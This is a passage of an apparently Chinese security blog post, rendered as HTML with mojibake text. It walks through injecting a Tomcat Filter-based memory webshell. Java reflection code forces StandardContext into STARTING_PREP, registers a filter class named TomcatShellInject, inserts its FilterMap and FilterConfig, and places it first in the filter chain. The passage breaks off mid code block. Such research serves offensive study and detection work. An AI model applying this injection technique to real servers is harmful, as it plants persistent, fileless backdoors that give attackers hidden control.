</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">//ä¿®æ”¹çŠ¶æ€ï¼Œè¦ä¸ç„¶è°ƒç”¨addFilteræ–¹æ³•æ²¡æœ‰æ•ˆæœ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> stateField = org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">LifecycleBase</span>.<span style="color:#007f7f">class</span>
</span></span><span style="display:flex;"><span>        .<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;state&#34;</span>);
</span></span><span style="display:flex;"><span>stateField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>stateField.<span style="color:#007f7f">set</span>(standardContext, org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTING_PREP</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xxxxxxx 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// æ¢å¤çŠ¶æ€ï¼Œä½¿æœåŠ¡æ­£å¸¸ä½¿ç”¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">if</span>(stateField != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>    stateField.<span style="color:#007f7f">set</span>(standardContext,org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTED</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h6 id="é—®é¢˜äºŒ">é—®é¢˜äºŒ<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜äºŒ">#</a></h6>
<p>åœ¨å®é™…æ‰§è¡Œæ ˆä¸­ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå®é™…filterçš„åˆ›å»ºæ˜¯åœ¨<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>æ‰§è¡Œ<code>ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</code>çš„åœ°æ–¹ã€‚</p>
<p>åœ¨<code>createFilterchain</code>æ–¹æ³•ä¸­å…ˆé€šè¿‡<code>wrapper.getParent()</code>è·å¾—å½“å‰çš„<code>StandardContext</code>ï¼Œç„¶åä»contextä¸­è·å–<code>FilterMaps</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415162211826.png" alt="image-20230415162211826"  />
</p>
<p>æ¥ç€<code>createChain</code>æ–¹æ³•ä¼šéå† FilterMaps ä¸­çš„ FilterMapï¼Œå¦‚æœå‘ç°ç¬¦åˆå½“å‰è¯·æ±‚ url ä¸ FilterMap ä¸­çš„ urlPattern ç›¸åŒ¹é…ï¼Œå°±ä¼šè¿›å…¥ if åˆ¤æ–­ï¼Œè°ƒç”¨ findFilterConfig æ–¹æ³•åœ¨ filterConfigs ä¸­å¯»æ‰¾å¯¹åº” filterNameåç§°çš„ FilterConfigï¼Œç„¶åå¦‚æœä¸ä¸ºnullï¼Œå°±è¿›å…¥ if åˆ¤æ–­ï¼Œå°† filterConfig æ·»åŠ åˆ° filterChainä¸­ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415164106484.png" alt="image-20230415164106484"  />
</p>
<p>ä¸Šè¿°å¦‚æœè·å–åˆ°çš„<code>filterConfig</code>ä¸ä¸ºnullçš„è¯ï¼Œå°±è°ƒç”¨<code>org.apache.catalina.core.ApplicationFilterChain#addFilter</code>æ–¹æ³•å°†å½“å‰Filteræ·»åŠ åˆ°<code>FilterChain</code>ä¸Šé¢ã€‚</p>
<p>é¦–å…ˆä¼šéå†filtersï¼Œåˆ¤æ–­æˆ‘ä»¬çš„filteræ˜¯å¦å·²ç»å­˜åœ¨ï¼ˆå…¶å®å°±æ˜¯å»é‡ï¼‰ï¼Œæ¥ä¸‹æ¥çš„ if åˆ¤æ–­å°±æ˜¯æ‰©å®¹ï¼Œå¦‚æœ n å·²ç»ç­‰äºå½“å‰ filters çš„é•¿åº¦äº†å°±å†æ·»åŠ 10ä¸ªå®¹é‡ï¼Œæœ€åå°†æˆ‘ä»¬çš„filterConfig æ·»åŠ åˆ° filtersä¸­ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415164532159.png" alt="image-20230415164532159"  />
</p>
<p>è‡³æ­¤ filterChain ç»„è£…å®Œæ¯•ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>createFilterChain</code>æ–¹æ³•ä»<code>standardContext</code>ä¸­æå–äº†<code>FilterMaps</code>æ•°ç»„ï¼Œç„¶åéå†FilterMapsï¼Œå¯¹æ¯ä¸ªFilterMapå¯¹åº”çš„FilterNameä»<code>standardContext</code>ä¸­è·å–å¯¹åº”çš„<code>FilterConfig</code>ï¼Œæœ€åå°†è¯¥filterConfigæ·»åŠ åˆ°<code>filterChain</code>ä¸­ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨FilterMapså’ŒFilterConfigsä¸­æ³¨å†Œå°è£…æˆ‘ä»¬è‡ªå®šä¹‰çš„Filterç›¸å…³ä¿¡æ¯çš„FilterMapå’ŒFilterConfigã€‚</p>
<p><strong>æ³¨å†ŒFilterMap:</strong></p>
<ul>
<li>
<p>æˆ‘ä»¬ä¹‹å‰é€šè¿‡<code>org.apache.catalina.core.ApplicationContext#addFilter()</code>æ–¹æ³•å¾—åˆ°çš„<code>FilterRegistration</code>å¯¹è±¡å¯ä»¥è°ƒç”¨<code>org.apache.catalina.core.ApplicationFilterRegistration#addMappingForUrlPatterns</code>æ–¹æ³•ï¼Œå®ç°å°†filterMapæ’å…¥åˆ°standardContextçš„filterMapsä¸­ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417141608932.png" alt="image-20230417141608932"  />
</p>
</li>
<li>
<p>å› æ­¤æ³¨å†ŒFilterDefå’ŒFilterMapçš„å®Œæ•´æ“ä½œä¸ºï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">//ä¿®æ”¹çŠ¶æ€ï¼Œè¦ä¸ç„¶è°ƒç”¨addFilteræ–¹æ³•æ²¡æœ‰æ•ˆæœ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> stateField = org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">LifecycleBase</span>.<span style="color:#007f7f">class</span>
</span></span><span style="display:flex;"><span>        .<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;state&#34;</span>);
</span></span><span style="display:flex;"><span>stateField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>stateField.<span style="color:#007f7f">set</span>(standardContext, org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTING_PREP</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„Filteré©¬
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>Filter filter = <span style="color:#fff;font-weight:bold">new</span> TomcatShellInject();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// è°ƒç”¨addFilter æ–¹æ³•æ·»åŠ 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">FilterRegistration</span>.<span style="color:#007f7f">Dynamic</span> filterRegistration = servletContext.<span style="color:#007f7f">addFilter</span>(FILTER_NAME,filter);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// è¿›è¡Œä¸€äº›ç®€å•çš„è®¾ç½®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterRegistration.<span style="color:#007f7f">setInitParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;encoding&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>);
</span></span><span style="display:flex;"><span>filterRegistration.<span style="color:#007f7f">setAsyncSupported</span>(<span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// è®¾ç½®åŸºæœ¬çš„url pattern, å¹¶ä¸”æ³¨å†ŒfilterMap
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterRegistration.<span style="color:#007f7f">addMappingForUrlPatterns</span>(java.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">EnumSet</span>.<span style="color:#007f7f">of</span>(javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">DispatcherType</span>.<span style="color:#007f7f">REQUEST</span>),<span style="color:#fff;font-weight:bold">false</span>,<span style="color:#fff;font-weight:bold">new</span> String[]{FILTER_URL_PATTERN});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// æ¢å¤çŠ¶æ€ï¼Œä½¿æœåŠ¡æ­£å¸¸ä½¿ç”¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">if</span>(stateField != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>    stateField.<span style="color:#007f7f">set</span>(standardContext,org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTED</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p><strong>æ³¨å†ŒFilterConfig:</strong></p>
<p>ç¬¬ä¸€ç§æ–¹æ³•ï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è·å¾—<code>StandardContext</code>å¯¹è±¡çš„<code>filterConfigs</code>å±æ€§ï¼Œç„¶åå®ä¾‹åŒ–å°è£…ä¸€ä¸ªFilterConfigå¯¹è±¡ï¼Œç„¶åç›´æ¥å°†å…¶æ·»åŠ åˆ°filterConfigsä¸­ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//è·å¾—filterconfigs
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>Field Configs = standardContext.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;filterConfigs&#34;</span>);
</span></span><span style="display:flex;"><span>Configs.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>Map filterConfigs = (Map) Configs.<span style="color:#007f7f">get</span>(standardContext);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// å®ä¾‹åŒ–ä¸€ä¸ªApplicationFilterConfigå¯¹è±¡
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>Constructor constructor = ApplicationFilterConfig.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredConstructor</span>(Context.<span style="color:#007f7f">class</span>,FilterDef.<span style="color:#007f7f">class</span>);
</span></span><span style="display:flex;"><span>constructor.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.<span style="color:#007f7f">newInstance</span>(standardContext,filterDef);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// filterConfigçš„Mapæ˜¯ä¸€ä¸ªHashMap&lt;String, ApplicationFilterConfig&gt;ç±»å‹çš„ï¼Œç›´æ¥å‹å…¥å°±å¯ä»¥
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterConfigs.<span style="color:#007f7f">put</span>(name,filterConfig);
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬äºŒç§æ–¹æ³•ï¼š</p>
<p>åœ¨<code>StandardContext</code>ä¸­çš„æ–¹æ³•<code>filterStartå®ç°</code>äº†æ ¹æ®<code>filterDefs</code>ç”Ÿæˆ<code>filterConfigs</code>ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417143223620.png" alt="image-20230417143223620"  />
</p>
<p>å› æ­¤æˆ‘ä»¬é€šè¿‡åå°„ç›´æ¥æ‰§è¡Œ<code>filterStart</code>æ–¹æ³•å°±å¯ä»¥å®ç°æ³¨å†ŒFilterConfig</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// è®¾ç½®filterä¹‹åè°ƒç”¨ filterstart æ¥å¯åŠ¨æˆ‘ä»¬çš„ filter
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Method</span> filterStartMethod = StandardContext.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredMethod</span>(<span style="color:#0ff;font-weight:bold">&#34;filterStart&#34;</span>);
</span></span><span style="display:flex;"><span>filterStartMethod.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>filterStartMethod.<span style="color:#007f7f">invoke</span>(standardContext,<span style="color:#fff;font-weight:bold">null</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="è‡ªå®šä¹‰filterä¼˜å…ˆ">è‡ªå®šä¹‰filterä¼˜å…ˆ<a hidden class="anchor" aria-hidden="true" href="#è‡ªå®šä¹‰filterä¼˜å…ˆ">#</a></h6>
<p>å›çœ‹<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>çš„ä»£ç </p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// Add the relevant path-mapped filters to this filter chain
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">for</span> (FilterMap filterMap : filterMaps) {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!matchDispatcher(filterMap, dispatcher)) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!matchFiltersURL(filterMap, requestPath)) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
</span></span><span style="display:flex;"><span>            context.<span style="color:#007f7f">findFilterConfig</span>(filterMap.<span style="color:#007f7f">getFilterName</span>());
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (filterConfig == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// FIXME - log configuration problem
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    filterChain.<span style="color:#007f7f">addFilter</span>(filterConfig);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ›å»ºçš„é¡ºåºæ˜¯æ ¹æ®filterMapsçš„é¡ºåºæ¥çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰å¿…è¦å»ä¿®æ”¹æˆ‘ä»¬æ·»åŠ çš„filteré¡ºåºåˆ°ç¬¬ä¸€ä½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹æˆ‘ä»¬æ³¨å†Œçš„filterMapåœ¨filterMapsä¸­æ˜¯ç¬¬ä¸€ä¸ªå°±å¯ä»¥äº†ã€‚</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
